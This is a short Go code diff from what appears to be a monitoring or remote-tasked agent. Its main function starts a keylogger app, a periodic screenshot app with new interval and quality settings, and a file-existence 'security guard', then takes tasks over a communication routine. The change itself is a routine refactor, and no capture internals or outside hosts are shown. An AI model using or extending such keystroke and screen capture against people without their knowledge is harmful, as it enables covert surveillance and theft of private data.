@@ -45,18 +45,20 @@ func main() {
 
 	appManager := apps.GetAppManagerInstance()
 	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
-	appManager.StartApp(string(apps.ScreenShotTask)+"_default", &apps.ScreenshotApp{
-		Interval: int8(configInstance.Apps.Screenshot["Interval"].(int)),
-	})
+
+	appManager.StartApp(string(apps.ScreenShotTask)+"_default", apps.NewScreenshotApp(
+		configInstance.Apps.Screenshot["Interval"].(int),
+		configInstance.Apps.Screenshot["Quality"].(int),
+	))
 	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
 		FilesExistence: []string{
-			configInstance.Installation.LogFilePath,
 			configInstance.Installation.DBPath,
 		},
 	})
 
 	taskCh := make(chan apps.AppData)
 	go communication.Routine(taskCh)
+	// TODO: should be done in the task/app manager
 	for task := range taskCh {
 		// TODO: handle config change
 		if app, err := apps.NewAppFactory(task); err != nil {
